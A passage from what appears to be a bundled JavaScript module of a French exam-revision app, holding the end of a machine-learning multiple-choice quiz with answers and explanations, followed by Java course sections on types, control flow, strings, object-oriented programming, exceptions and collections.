d'un réseau de neurones multi-couches ?`,o:["Pour accélérer le temps d'exécution","Pour normaliser les données d'entrée","Pour introduire de la non-linéarité dans le modèle","Pour empêcher le surapprentissage (overfitting)"],a:2,e:"Réponse : C) Sans fonction d'activation non-linéaire, la combinaison de plusieurs couches linéaires revient mathématiquement à une seule couche linéaire : W2 (W1 X) = (W2 W1 )X = Wglobal X . Les fonctions comme ReLU et Sigmoïde permettent au réseau d'apprendre des frontières de décision complexes et courbes (non-linéaires)."},{q:`Dans l'algorithme K-NN, que représente le "K" ?`,o:["Le nombre de classes dans le dataset","Le nombre de voisins les plus proches considérés pour la prédiction","Le nombre de dimensions (features) du dataset","Le nombre d'itérations (epochs) d'entraînement"],a:1,e:"Réponse : B) Dans K-Nearest Neighbors, K est un hyperparamètre définissant combien de voisins on regarde autour du point à prédire. Par exemple, si K = 5, l'algorithme regarde les 5 points les plus proches et fait voter la majorité pour déterminer la classe."},{q:`Dans un Réseau de Neurones Convolutif (CNN) traitant des images, quel est le rôle principal
d'une couche de "Pooling" (ex: Max-Pooling) ?`,o:["Extraire des couleurs spécifiques","Réduire la dimension spatiale (largeur x hauteur) des cartes de caractéristiques","Appliquer la descente de gradient","Transformer l'image de la 2D vers la 1D (Flatten)"],a:1,e:`Réponse : B) Le Pooling (ex: prendre le pixel de valeur maximale dans un carré 2 × 2) sert à réduire la résolution des feature maps. Ceci réduit la puissance de calcul nécessaire, réduit l'overfitting, et apporte une "invariance spatiale locale" (le modèle reconnaît l'objet même s'il est légèrement décalé). Aplatir de 2D vers 1D est fait par la couche Flatten (Rép D).`},{q:"Quel est le principe de la K-Fold Cross-Validation ?",o:["Entraîner K modèles différents sur le dataset et faire voter le meilleur","Diviser le dataset en K sous-ensembles, entraîner K fois le modèle en utilisant à chaque fois","Répéter l'entraînement d'un réseau de neurones pendant K époques","Multiplier les données par K pour éviter l'overfitting"],a:1,e:`Réponse : B) La K-Fold découpe la data en K "plis" (folds). On entraîne le modèle K fois. À chaque itération, un pli différent sert de validation (test), et le reste d'entraînement. Le score final est la moyenne des K scores. Cela garantit une évaluation robuste, indépendante du split train/test initial.`},{q:`Vous construisez un modèle pour détecter les tumeurs malignes (Cancer). Les faux négatifs (le
modèle dit "sain", le patient a le cancer) sont extremement dangereux. Quelle métrique devez-
vous maximiser en priorité ?`,o:["Précision (Precision)","Rappel (Recall)","Exactitude (Accuracy)","R2 Score"],a:1,e:"Réponse : B) Rappel (Recall) Le Rappel (Recall) répond à la question : Parmi tous les malades (Vrais Positifs + Faux Négatifs), combien ai-je trouvé ? Maximiser le rappel minimise les Faux Négatifs. Dans le médical, on préfère avoir quelques faux positifs (faire des examens complémentaires pour rien) plutôt que de rater un patient malade (faux négatif mortel)."},{q:`Dans l'apprentissage par renforcement, comment l'agent apprend-il à prendre les bonnes décisions
?`,o:["En minimisant une fonction de perte (MSE) sur un dataset pré-labellisé","En observant les centroïdes des données","En maximisant une récompense cumulative reçue de l'environnement","En appliquant des filtres de convolution"],a:2,e:"Réponse : C) Le Reinforcement Learning est basé sur l'interaction Agent-Environnement. L'agent effectue une Action, l'Environnement change d'État et lui renvoie une Récompense (+1, 0, -1). Le but de l'agent (via des algo comme le Q-Learning) est de trouver la politique (policy ) qui maximise la récompense cumulée sur le long terme."},{q:`Lors de l'entraînement d'un réseau de neurones, vous observez que la Loss function "rebondit"
fortement et diverge vers l'infini au lieu de descendre. Quel est le problème le plus probable ?`,o:["Le taux d'apprentissage (Learning Rate) est trop petit","Le taux d'apprentissage (Learning Rate) est trop grand","Le batch size est trop grand","Le modèle est en sous-apprentissage"],a:1,e:"Réponse : B) Dans la descente de gradient :  Learning Rate trop petit : la Loss descend très doucement, l'entraînement est extrêmement long.  Learning Rate trop grand : l'algorithme fait des pas géants, il dépasse le minimum local, rebondit sur les parois de la cuvette d'erreur, et diverge."},{q:`Quelle architecture de réseau de neurones est historiquement spécialisée pour le traitement de
données séquentielles comme le texte ou les séries temporelles ?`,o:["CNN (Convolutional Neural Network)","K-Means","RNN (Recurrent Neural Network / LSTM)","SVM"],a:2,e:"Réponse : C) RNN Les Réseaux Récurrents (RNN) possèdent une mémoire interne leur permettant de retenir les informations des étapes précédentes de la séquence, ce qui est indispensable pour le texte (où le sens d'un mot dépend de ce qui précède) ou la voix. (Aujourd'hui, les modèles Transformers comme GPT ont largement pris la relève des RNN pour le NLP). 8| Mémo de Dernière Minute ★ Astuce Concours Checklist Révision Rapide :  Supervisé : Modèle entraîné sur X → Y (Régression, Classification).  Non-Supervisé : Modèle trouve les structures dans X (Clustering : K-Means, DBSCAN).  Classification : Prédire une catégorie (Chat/Chien). (Arbres, SVM, Rég. Logistique, KNN).  Régression : Prédire"}],w2={id:Bf,name:Ff,color:kf,sections:jf,quiz:Uf},B2=Object.freeze(Object.defineProperty({__proto__:null,color:kf,default:w2,id:Bf,name:Ff,quiz:Uf,sections:jf},Symbol.toStringTag,{value:"Module"})),Vf="java",_f="Java",Hf="#fb923c",zf=[{id:"1.1",c:1,t:"Architecture Java",x:`❖ Définition
     Java est un langage de programmation orienté objet, créé par Sun Microsystems (1995), racheté
     par Oracle. Principes fondamentaux :
      «Write Once, Run Anywhere» (WORA) : grâce à la JVM
      Compilé + Interprété : le code source est compilé en bytecode (.class), puis interprété par
       la JVM
      Fortement typé : chaque variable a un type déclaré
      Gestion automatique de la mémoire : Garbage Collector
      Multi-thread natif

     ➔ Résumé rapide Composants Java

      Composant      Signification                  Rôle

      JDK            Java Development Kit          Compilateur + JRE (pour développeurs)
      JRE            Java Runtime Environment      JVM + bibliothèques (pour exécuter)
      JVM            Java Virtual Machine          Exécute le bytecode
      JIT            Just-In-Time compiler         Optimise le bytecode en code natif

     ➣ Syntaxe / Code Programme Java minimal

 1   // Fichier : Main . java ( nom = nom de la classe publique !)
 2   public class Main {
 3       public static void main ( String [] args ) {
 4           System . out . println ( " Bonjour Java ! " ) ;
 5           System . out . print ( " Sans retour ligne " ) ;
 6           System . out . printf ( " Formatte : %d , %.2 f , % s % n " , 42 , 3.14 , " ok " ) ;
 7       }
 8   }
10   // Compilation et execution :
11   // javac Main . java --> produit Main . class ( bytecode )
12   // java Main         --> execute via JVM`},{id:"1.2",c:1,t:"Types de données primitifs",x:`1.2.   TYPES DE DONNÉES PRIMITIFS

     ➔ Résumé rapide Types primitifs Java

      Type      Taille    Min          Max            Défaut

      byte      8 bits    -128         127            0
      short     16 bits   -32 768      32 767         0
      int       32 bits   −231      231 − 1           0
      long      64 bits   −263      263 − 1           0L
      float      32 bits       ±3.4 × 1038             0.0f
      double    64 bits      ±1.8 × 10308             0.0
      char      16 bits   '\\u0000'     '\\uFFFF'       '\\u0000'
      boolean   1 bit            true / false         false

     ➣ Syntaxe / Code Variables et opérateurs

 1   // Declaration et initialisation
 2   int age = 22;
 3   double pi = 3.14159;
 4   long population = 8 _000_000_000L ;                   // _ pour lisibilite
 5   float prix = 19.99 f ;                                // f obligatoire pour float
 6   char lettre = 'A ';
 7   boolean actif = true ;
 8   final int MAX = 100;                                  // constante
10   // var ( Java 10+) : inference de type locale
11   var liste = new ArrayList < String >() ;
12   var x = 42;     // int infere
14   // Operateurs arithmetiques
15   int a = 10 , b = 3;
16   a + b      // 13
17   a - b      // 7
18   a * b      // 30
19   a / b      // 3 ( division entiere !)
20   a % b      // 1 ( modulo )
21   Math . pow (2 , 10)  // 1024.0 ( double )
23   // Operateurs de comparaison
24   a == b , a != b , a < b , a <= b , a > b , a >= b
26   // Operateurs logiques
27   && ( AND court - circuit ) , ||             ( OR court - circuit ) , !      ( NOT )
29   // Operateurs bits
30   &   ( AND ) , | ( OR ) , ^       ( XOR ) , ~     ( NOT ) , <<     ( LSL ) , >>    ( ASR )
32   // Incrementation
33   i ++ ( post - increment ) , ++ i           ( pre - increment )
34   i - - ( post - decrement ) , --i           ( pre - decrement )

     ☞ Attention / Piège

 1   // Division entiere !
 2   int x = 7 / 2;          // x = 3 , pas 3.5 !
 3   double y = 7.0 / 2;     // y = 3.5 ( un double suffit )
 4   double z = ( double ) 7 / 2; // z = 3.5 ( cast )

                                                             1.3.   STRUCTURES DE CONTRÔLE

 6   // Overflow silencieux
 7   int max = Integer . MAX_VALUE ; // 2147483647
 8   max + 1;    // -2147483648 ! ( pas d ' exception )
10   // == sur les objets compare les references , pas les valeurs
11   String s1 = new String ( " hello " ) ;
12   String s2 = new String ( " hello " ) ;
13   s1 == s2 ;           // false ( references differentes )
14   s1 . equals ( s2 ) ; // true ( meme contenu )
16   // Strings litteraux sont internees
17   String a = " hello " ;
18   String b = " hello " ;
19   a == b ;               // true ( meme objet intern )`},{id:"1.3",c:1,t:"Structures de contrôle",x:`➣ Syntaxe / Code Conditions et boucles

 1   // if / else if / else
 2   if ( age >= 18) {
 3        System . out . println ( " Majeur " ) ;
 4   } else if ( age >= 15) {
 5        System . out . println ( " Adolescent " ) ;
 6   } else {
 7        System . out . println ( " Enfant " ) ;
 8   }
10   // Operateur ternaire
11   String statut = ( age >= 18) ? " Majeur " : " Mineur " ;
13   // switch ( classique )
14   switch ( jour ) {
15       case 1: System . out . println ( " Lundi " ) ; break ;
16       case 2: System . out . println ( " Mardi " ) ; break ;
17       default : System . out . println ( " Autre " ) ; break ;
18   }
20   // switch expression ( Java 14+)
21   String nom = switch ( jour ) {
22       case 1 -> " Lundi " ;
23       case 2 -> " Mardi " ;
24       case 6 , 7 -> " Week - end " ;
25       default -> " Semaine " ;
26   };
28   // for classique
29   for ( int i = 0; i < 10; i ++) { System . out . println ( i ) ; }
31   // for - each ( enhanced for )
32   int [] tab = {1 , 2 , 3 , 4 , 5};
33   for ( int val : tab ) { System . out . println ( val ) ; }
35   // while
36   int n = 10;

                                                                       1.4.   TABLEAUX (ARRAYS)

37   while ( n > 0) { n - -; }
39   // do - while ( execute au moins une fois )
40   do {
41        n ++;
42   } while ( n < 10) ;
44   // break avec label ( sort de la boucle externe )
45   outer :
46   for ( int i = 0; i < 5; i ++) {
47       for ( int j = 0; j < 5; j ++) {
48            if ( i == j ) break outer ;
49       }
50   }`},{id:"1.4",c:1,t:"Tableaux (Arrays)",x:`➣ Syntaxe / Code Tableaux Java

 1   // Tableaux 1 D
 2   int [] tab = new int [5];                // {0 , 0 , 0 , 0 , 0}
 3   int [] tab2 = {10 , 20 , 30 , 40 , 50}; // initialisation directe
 4   int [] tab3 = new int []{1 , 2 , 3};    // style 3
 6   tab [0] = 99;               // modification
 7   tab . length ;              // taille ( pas une methode !)
 9   // Tableaux 2 D
10   int [][] matrice = new int [3][4];
11   int [][] mat2 = {{1 ,2 ,3} ,{4 ,5 ,6} ,{7 ,8 ,9}};
13   for ( int i = 0; i < mat2 . length ; i ++)
14       for ( int j = 0; j < mat2 [ i ]. length ; j ++)
15            System . out . print ( mat2 [ i ][ j ] + " " ) ;
17   // Utilitaires java . util . Arrays
18   Arrays . sort ( tab ) ;                   //         tri ( in - place )
19   Arrays . fill ( tab , 0) ;                //         remplir
20   Arrays . copyOf ( tab , tab . length ) ;  //         copie
21   Arrays . copyOfRange ( tab , 1 , 4) ;     //         copie partielle
22   Arrays . toString ( tab ) ;               //         "[10 , 20 , 30]"
23   Arrays . equals ( tab , tab2 ) ;          //         comparaison contenu
24   int idx = Arrays . binarySearch ( tab , 30) ;        // recherche ( tri requis )`},{id:"1.5",c:1,t:"Chaînes de caractères (String)",x:`◆ Concept clé
     String est immuable en Java ! Toute modification crée un nouvel objet.
     Pour les modifications fréquentes, utiliser   StringBuilder (non-thread-safe) ou StringBuffer
     (thread-safe).

                                                    1.5.   CHAÎNES DE CARACTÈRES (STRING)

     ➣ Syntaxe / Code Méthodes String importantes

 1   String s = " Bonjour Java " ;
 3   // Infos
 4   s . length ()               //   12
 5   s . charAt (0)              //   'B '
 6   s . indexOf ( " Java " )    //   8 ( -1 si absent )
 7   s . lastIndexOf ( 'o ')     //   4
 8   s . isEmpty ()              //   false
 9   s . isBlank ()              //   false ( Java 11+)
11   // Transformation
12   s . toUpperCase ()                // " BONJOUR JAVA "
13   s . toLowerCase ()                // " bonjour java "
14   s . trim ()                       // enleve espaces avant / apres
15   s . strip ()                      // comme trim () mais Unicode ( Java 11+)
16   s . replace ( " Java " , " Python " ) // " Bonjour Python "
17   s . replaceAll ( " \\\\ s + " , " " )     // regex
19   // Extraction
20   s . substring (8)           // " Java "
21   s . substring (0 , 7)       // " Bonjour "
22   s . split ( " " )           // [" Bonjour " , " Java "]
24   // Test
25   s . equals ( " Bonjour Java " )    // true ( case - sensitive )
26   s . equalsIgnoreCase ( " BONJOUR java " ) // true
27   s . startsWith ( " Bon " )         // true
28   s . endsWith ( " Java " )          // true
29   s . contains ( " njour " )         // true
30   s . matches ( " [A - Za - z ]+ " ) // regex
32   // Conversion
33   String . valueOf (42)           // "42"
34   Integer . parseInt ( " 42 " ) // 42
35   Double . parseDouble ( " 3.14 " ) // 3.14
36   String . format ( " %.2 f " , 3.14159) // "3.14"
38   // StringBuilder
39   StringBuilder sb = new StringBuilder () ;
40   sb . append ( " Hello " ) ;
41   sb . append ( " " ) . append ( " World " ) ;
42   sb . insert (5 , " ," ) ;
43   sb . reverse () ;
44   sb . toString () ; // " dlroW , olleH "

           Part II

Programmation Orientée Objet

       2|         Classes et Objets`},{id:"2.1",c:2,t:"Définition d'une classe",x:`➣ Syntaxe / Code Classe complète — Etudiant

 1   public class Etudiant {
 3       // Attributs ( champs / fields )
 4       private String nom ;           // prive ( encapsulation )
 5       private int age ;
 6       private double moyenne ;
 7       public static int compteur = 0; // attribut de classe
 9       // Constructeur par defaut
10       public Etudiant () {
11           this . nom = " Inconnu " ;
12           this . age = 0;
13           Etudiant . compteur ++;
14       }
16       // Constructeur parametre
17       public Etudiant ( String nom , int age , double moyenne ) {
18           this . nom = nom ;
19           this . age = age ;
20           this . moyenne = moyenne ;
21           Etudiant . compteur ++;
22       }
24       // Constructeur de copie
25       public Etudiant ( Etudiant autre ) {
26           this ( autre . nom , autre . age , autre . moyenne ) ;
27       }
29       // Getters ( accesseurs )
30       public String getNom ()     { return nom ; }
31       public int getAge ()        { return age ; }
32       public double getMoyenne () { return moyenne ; }
34       // Setters ( mutateurs ) avec validation
35       public void setAge ( int age ) {
36           if ( age >= 0 && age <= 120)
37                this . age = age ;
38           else
39                throw new IllegalArgumentException ( " Age invalide : " + age ) ;
40       }
42       // Methode metier
43       public String getMention () {
44           if ( moyenne >= 16) return       " Tres Bien " ;
45           if ( moyenne >= 14) return       " Bien " ;
46           if ( moyenne >= 12) return       " Assez Bien " ;
47           if ( moyenne >= 10) return       " Passable " ;

                                                               2.1.   DÉFINITION D'UNE CLASSE

48            return " Ajourne " ;
49       }
51       // Methode statique
52       public static int getCompteur () { return compteur ; }
54       // toString ( herite de Object , redefinit )
55       @Override
56       public String toString () {
57           return String . format ( " Etudiant { nom = '% s ', age =% d , moy =%.2 f } " ,
58                                    nom , age , moyenne ) ;
59       }
61       // equals ( herite de Object , redefinit )
62       @Override
63       public boolean equals ( Object obj ) {
64           if ( this == obj ) return true ;
65           if (!( obj instanceof Etudiant ) ) return false ;
66           Etudiant other = ( Etudiant ) obj ;
67           return nom . equals ( other . nom ) && age == other . age ;
68       }
70       // hashCode ( toujours redefinir avec equals !)
71       @Override
72       public int hashCode () {
73           return Objects . hash ( nom , age ) ;
74       }
75   }
77   // Utilisation
78   Etudiant e1 = new Etudiant ( " Ahmed " , 22 , 15.5) ;
79   Etudiant e2 = new Etudiant ( e1 ) ;              // copie
80   System . out . println ( e1 ) ;                   // toString ()
81   System . out . println ( Etudiant . compteur ) ;  // attribut statique

     ★ Astuce Concours

                               Modificateur      Classe    Package     Sous-classe    Partout

                               private          ✓
     Modificateurs d'accès :    (package)        ✓         ✓
                               protected        ✓         ✓           ✓
                               public           ✓         ✓           ✓              ✓

         3|         Héritage et Polymorphisme`},{id:"3.1",c:3,t:"Héritage (extends)",x:`❖ Définition
     En Java, une classe peut hériter d'une seule classe mère (héritage   simple).   Le mot-clé est
     extends. La classe mère de toutes les classes est Object.

     ➣ Syntaxe / Code Héritage

 1   // Classe mere ( parent )
 2   public class Animal {
 3       protected String nom ;
 4       protected int age ;
 6        public Animal ( String nom , int age ) {
 7            this . nom = nom ;
 8            this . age = age ;
 9        }
11        public String parler () {
12            return nom + " fait un son " ;
13        }
15        public String toString () {
16            return " Animal ( " + nom + " , " + age + " ) " ;
17        }
18   }
20   // Classe fille ( enfant )
21   public class Chien extends Animal {
22       private String race ;
24        public Chien ( String nom , int age , String race ) {
25            super ( nom , age ) ; // DOIT etre la 1 ere instruction
26            this . race = race ;
27        }
29        @Override                 // annotation ( verification compilation )
30        public String parler () {
31            return nom + " dit : Ouaf ! " ;
32        }
34        public String toString () {
35            return super . toString () + " , race = " + race ;
36        }
37   }
39   // Classe fille de Chien
40   public class Labrador extends Chien {
41       public Labrador ( String nom , int age ) {

                                                                          3.2.   POLYMORPHISME

42             super ( nom , age , " Labrador " ) ;
43        }
45        @Override
46        public String parler () {
47            return super . parler () + " ( joyeusement ) " ;
48        }
49   }`},{id:"3.2",c:3,t:"Polymorphisme",x:`❖ Définition
     Le polymorphisme permet à une référence de type mère de pointer vers des objets de types fils
     différents, et d'appeler la méthode correcte à l'exécution (liaison dynamique / late binding).

     ➣ Syntaxe / Code Polymorphisme et instanceof

 1   // Tableau polymorphe
 2   Animal [] animaux = {
 3       new Chien ( " Rex " , 3 , " Berger " ) ,
 4       new Labrador ( " Max " , 5) ,
 5       new Animal ( " Cat " , 2)
 6   };
 8   for ( Animal a : animaux ) {
 9       System . out . println ( a . parler () ) ;    // appel polymorphe
10   }
12   // instanceof + downcasting
13   for ( Animal a : animaux ) {
14       if ( a instanceof Chien c ) {             // Java 16+: pattern matching
15            System . out . println ( c . getRace () ) ;
16       }
17       // Ancienne syntaxe :
18       if ( a instanceof Chien ) {
19            Chien c = ( Chien ) a ;              // downcast
20       }
21   }
23   // Upcasting automatique ( implicite )
24   Chien chien = new Chien ( " Rex " , 3 , " Berger " ) ;
25   Animal a = chien ;  // OK : upcast automatique
26   // a . getRace () ; // ERREUR : Animal n 'a pas getRace ()
28   // Le type declare vs type reel
29   Animal a2 = new Chien ( " Lola " , 2 , " Caniche " ) ;
30   a2 . parler () ; // appelle Chien . parler () ( type reel decide )`},{id:"3.3",c:3,t:"Classes abstraites et Interfaces",x:`3.3.   CLASSES ABSTRAITES ET INTERFACES

     ❖ Définition
     Classe abstraite (abstract class) :
      Peut avoir des méthodes abstraites (sans corps) ET concrètes
      Ne peut pas être instanciée directement
      Une classe fille doit implémenter toutes les méthodes abstraites
      Peut avoir des constructeurs, des attributs

     ➣ Syntaxe / Code Classe abstraite

 1   public abstract class Forme {
 2       protected String couleur ;
 4        public Forme ( String couleur ) {
 5            this . couleur = couleur ;
 6        }
 8        // Methodes abstraites ( obligatoires dans les sous - classes )
 9        public abstract double aire () ;
10        public abstract double perimetre () ;
12        // Methode concrete ( partagee par tous )
13        public void afficher () {
14            System . out . printf ( " Forme % s : aire =%.2 f % n " ,
15                                    couleur , aire () ) ;
16        }
17   }
19   public class Cercle extends Forme {
20       private double rayon ;
22        public Cercle ( String couleur , double rayon ) {
23            super ( couleur ) ;
24            this . rayon = rayon ;
25        }
27        @Override
28        public double aire () { return Math . PI * rayon * rayon ; }
30        @Override
31        public double perimetre () { return 2 * Math . PI * rayon ; }
32   }

     ❖ Définition
     Interface :
      Contrat pur : toutes les méthodes sont implicitement public abstract (sauf default et
       static)
      Tous les attributs sont public static final (constantes)
      Une classe peut implémenter plusieurs interfaces (implements)
      Depuis Java 8 : méthodes default et static
      Depuis Java 9 : méthodes private

                                                3.3.   CLASSES ABSTRAITES ET INTERFACES

     ➣ Syntaxe / Code Interfaces

 1   // Interface
 2   public interface Dessinable {
 3       void dessiner () ;                // public abstract implicite
 4       default void effacer () {         // methode par defaut ( Java 8+)
 5           System . out . println ( " Effacement par defaut " ) ;
 6       }
 7       static int getVersion () { return 2; } // statique ( Java 8+)
 8   }
10   public interface Redimensionnable {
11       void redimensionner ( double facteur ) ;
12   }
14   // Une classe peut implementer plusieurs interfaces
15   public class Rectangle extends Forme
16           implements Dessinable , Redimensionnable {
17       private double largeur , hauteur ;
19       public Rectangle ( String couleur , double l , double h ) {
20           super ( couleur ) ;
21           this . largeur = l ; this . hauteur = h ;
22       }
24       @Override public double aire () { return largeur * hauteur ; }
25       @Override public double perimetre () { return 2*( largeur + hauteur ) ; }
26       @Override public void dessiner () {
27           System . out . println ( " Dessine un rectangle " + largeur + " x " +
                hauteur ) ;
28       }
29       @Override public void redimensionner ( double f ) {
30           largeur *= f ; hauteur *= f ;
31       }
32   }
34   // Interface comme type
35   Dessinable d = new Rectangle ( " rouge " , 3 , 4) ;
36   d . dessiner () ;
38   // Interface fonctionnelle ( Java 8+) : exactement 1 methode abstraite
39   @FunctionalInterface
40   interface Calculable {
41       double calculer ( double a , double b ) ;
42   }
44   Calculable addition = (a , b ) -> a + b ; // lambda !
45   System . out . println ( addition . calculer (3 , 4) ) ; // 7.0

                                                              3.4.   MODIFICATEURS IMPORTANTS

     ➔ Résumé rapide Classe abstraite vs Interface

      Critère         Classe abstraite         Interface

      Héritage        Simple (extends 1)       Multiple (implements N)
      Constructeur    Oui                      Non
      Attributs       Tous types               public static final
      Méthodes        Abstraites + concrètes   Abstract + default + static
      Usage           «est-un» (taxonomie)     «peut-faire» (capacité)`},{id:"3.4",c:3,t:"Modificateurs importants",x:`➣ Syntaxe / Code final, static, this, super

 1   // final
 2   final int MAX = 100;                      // constante ( variable )
 3   final class Immutable { ... }             // classe non - extensible
 4   public final void methode () {}           // methode non - surchargeable
 6   // static
 7   static int compteur = 0;        // partagee entre instances
 8   static void help () { ... }     // appelable sans instance
 9   // Attention : une methode static ne peut pas utiliser this / super
11   // this
12   this . nom = nom ;                        // attribut vs parametre
13   this ( " nom " , 0) ;                     // appel d ' un autre constructeur
15   // super
16   super . methode () ;                      // methode de la classe mere
17   super ( args ) ;                          // constructeur de la classe mere (1 ere
        instruction )
19   // Enum
20   public enum Jour {
21       LUNDI , MARDI , MERCREDI , JEUDI , VENDREDI , SAMEDI , DIMANCHE ;
23        public boolean estWeekEnd () {
24            return this == SAMEDI || this == DIMANCHE ;
25        }
26   }
27   Jour j = Jour . LUNDI ;
28   j . name () ;        // " LUNDI "
29   j . ordinal () ;     // 0
30   Jour . values () ; // tableau de tous les enum
31   Jour . valueOf ( " MARDI " ) ; // Jour . MARDI

               Part III

Gestion des Exceptions et Collections

        4|          Gestion des Exceptions`},{id:"4.1",c:4,t:"Hiérarchie des exceptions",x:`❖ Définition
     En Java, les exceptions sont des objets. Hiérarchie :
      Throwable
         — Error : erreurs JVM graves (OutOfMemoryError, StackOverflowError) — ne pas attraper
         — Exception
              * Checked exceptions (vérifiées) :       IOException, SQLException —   obligatoire de
                traiter
              * RuntimeException (unchecked) : NullPointerException, ArrayIndexOutOfBound-
                sException, ClassCastException, IllegalArgumentException — facultatif

     ➣ Syntaxe / Code Gestion des exceptions

 1   // try / catch / finally
 2   try {
 3       int [] tab = new int [5];
 4       tab [10] = 1;                     // ArrayIndexOutOfBoundsException
 5       int x = 5 / 0;                  // ArithmeticException
 6   } catch ( ArrayIndexOutOfBoundsException e ) {
 7       System . err . println ( " Index hors limites : " + e . getMessage () ) ;
 8   } catch ( ArithmeticException | NullPointerException e ) {
 9       // Multi - catch ( Java 7+)
10       System . err . println ( " Erreur : " + e . getMessage () ) ;
11   } catch ( Exception e ) {
12       e . printStackTrace () ;          // affiche la pile d ' appels
13   } finally {
14       System . out . println ( " Toujours execute ( nettoyage ) " ) ;
15   }
17   // throws : declarer qu ' une methode peut lancer une exception
18   public void lireFichier ( String chemin ) throws IOException {
19       // ...
20   }
22   // throw : lancer une exception
23   public void validerAge ( int age ) {
24       if ( age < 0) {
25            throw new IllegalArgumentException ( " Age negatif : " + age ) ;
26       }
27   }
29   // try - with - resources ( Java 7+) : fermeture automatique
30   try ( FileReader fr = new FileReader ( " data . txt " ) ;
31         BufferedReader br = new BufferedReader ( fr ) ) {
32       String ligne ;
33       while (( ligne = br . readLine () ) != null ) {
34             System . out . println ( ligne ) ;
35       }

                                                    4.1.   HIÉRARCHIE DES EXCEPTIONS

36   }   // fr et br sont fermes automatiquement ( AutoCloseable )

     ➣ Syntaxe / Code Exceptions personnalisées

 1   // Exception verificee ( extends Exception )
 2   public class SoldeInsuffisantException extends Exception {
 3       private double montant ;
 5        public SoldeInsuffisantException ( double montant ) {
 6            super ( " Solde insuffisant pour retirer " + montant ) ;
 7            this . montant = montant ;
 8        }
10        public double getMontant () { return montant ; }
11   }
13   // Exception non verificee ( extends RuntimeException )
14   public class AgeInvalideException extends RuntimeException {
15       public AgeInvalideException ( String message ) {
16           super ( message ) ;
17       }
18   }
20   // Utilisation
21   public void retirer ( double montant ) throws SoldeInsuffisantException {
22       if ( montant > solde ) {
23            throw new SoldeInsuffisantException ( montant ) ;
24       }
25       solde -= montant ;
26   }

          5|         Collections Framework`},{id:"5.1",c:5,t:"Vue d'ensemble",x:`◆ Concept clé
     Le   Java Collections Framework fournit des structures de données génériques.   Hiérarchie
     principale :
           Collection ← List, Set, Queue
           Map (indépendante de Collection)
           Toutes dans java.util

     ➔ Résumé rapide Comparaison des collections

      Interface     Implémentation    Ordré              Doublons

      List          ArrayList         Oui (insertion)    Oui
      List          LinkedList        Oui (insertion)    Oui
      Set           HashSet           Non                Non
      Set           LinkedHashSet     Insertion          Non
      Set           TreeSet           Trié               Non
      Map           HashMap           Non                Clés non
      Map           LinkedHashMap     Insertion          Clés non
      Map           TreeMap           Clés triées        Clés non
      Queue         PriorityQueue     Priorité           Oui
      Deque         ArrayDeque        Ins./LIFO          Oui`},{id:"5.2",c:5,t:"List",x:`➣ Syntaxe / Code ArrayList et LinkedList

 1   // ArrayList : acces rapide O (1) , insertion / suppr O ( n )
 2   List < String > liste = new ArrayList < >() ;
 3   liste . add ( " Alice " ) ;
 4   liste . add ( " Bob " ) ;
 5   liste . add (1 , " Charlie " ) ;  // insertion a l ' index 1
 6   liste . set (0 , " Alicia " ) ;   // modification
 7   liste . remove ( " Bob " ) ;      // suppression par valeur
 8   liste . remove (0) ;              // suppression par index
 9   liste . get (0) ;                 // acces O (1)
10   liste . size () ;                 // taille
11   liste . contains ( " Alice " ) ;  // test d ' appartenance
12   liste . indexOf ( " Alice " ) ;   // premier index
13   liste . isEmpty () ;              // vide ?
14   liste . clear () ;                // vider
16   // Parcours
17   for ( String s : liste ) { System . out . println ( s ) ; }

                                                                                          5.3.   MAP

18   liste . forEach ( System . out :: println ) ;        // Java 8+
19   liste . forEach ( s -> System . out . println ( s . toUpperCase () ) ) ;
21   // Tri
22   Collections . sort ( liste ) ;                      // ordre naturel
23   Collections . sort ( liste , Comparator . reverseOrder () ) ;
24   liste . sort (( a , b ) -> a . compareTo ( b ) ) ; // avec Comparator
25   liste . sort ( Comparator . naturalOrder () ) ;
27   // Collections utilitaires
28   Collections . shuffle ( liste ) ;
29   Collections . reverse ( liste ) ;
30   Collections . min ( liste ) ;
31   Collections . max ( liste ) ;
32   Collections . frequency ( liste , " Alice " ) ;
34   // LinkedList : insertion / suppr O (1) , acces O ( n )
35   LinkedList < Integer > ll = new LinkedList < >() ;
36   ll . addFirst (1) ;   ll . addLast (3) ;
37   ll . getFirst () ;    ll . getLast () ;
38   ll . removeFirst () ; ll . removeLast () ;
39   ll . peek () ;        // lire le premier sans retirer ( null si vide )
40   ll . poll () ;        // retirer le premier ( null si vide )

5.3     Map

     ➣ Syntaxe / Code HashMap et TreeMap

 1   // HashMap : O (1) en moyenne pour get / put / remove
 2   Map < String , Integer > notes = new HashMap < >() ;
 3   notes . put ( " Ahmed " , 15) ;
 4   notes . put ( " Sara " , 18) ;
 5   notes . put ( " Ahmed " , 16) ;  // remplace la valeur precedente
 7   notes . get ( " Ahmed " ) ;            // 16
 8   notes . getOrDefault ( " Inconnu " ,   0) ; // valeur par defaut
 9   notes . containsKey ( " Sara " ) ;     // true
10   notes . containsValue (18) ;           // true
11   notes . remove ( " Sara " ) ;
12   notes . size () ;
14   // Parcours
15   for ( Map . Entry < String , Integer > entry : notes . entrySet () ) {
16       System . out . println ( entry . getKey () + " -> " + entry . getValue () ) ;
17   }
18   notes . forEach (( cle , val ) -> System . out . println ( cle + " : " + val ) ) ;
19   notes . keySet () ;      // ensemble des cles
20   notes . values () ;      // collection des valeurs
22   // Methodes Java 8+
23   notes . putIfAbsent ( " Nouveau " , 10) ;
24   notes . computeIfAbsent ( " X " , k -> k . length () ) ;
25   notes . merge ( " Ahmed " , 1 , Integer :: sum ) ; // Ahmed += 1
27   // TreeMap : cles triees , O ( log n )
28   TreeMap < String , Integer > trie = new TreeMap < >( notes ) ;

                                                                                        5.4.   SET

29   trie . firstKey () ;         trie . lastKey () ;
30   trie . headMap ( " S " ) ;   // cles < " S "
31   trie . tailMap ( " S " ) ;   // cles >= " S "

5.4      Set

     ➣ Syntaxe / Code HashSet et TreeSet

 1   // HashSet : O (1) , pas d ' ordre garanti
 2   Set < String > ensemble = new HashSet < >() ;
 3   ensemble . add ( " Alpha " ) ;
 4   ensemble . add ( " Beta " ) ;
 5   ensemble . add ( " Alpha " ) ;     // ignore ( deja present )
 6   ensemble . contains ( " Beta " ) ; // true
 7   ensemble . remove ( " Beta " ) ;
 8   ensemble . size () ;               // 1
10   // Operations ensemblistes
11   Set < Integer > a = new HashSet < >( Arrays . asList (1 , 2 , 3 , 4) ) ;
12   Set < Integer > b = new HashSet < >( Arrays . asList (3 , 4 , 5 , 6) ) ;
14   Set < Integer > union = new HashSet < >( a ) ;
15   union . addAll ( b ) ;         // {1 ,2 ,3 ,4 ,5 ,6}
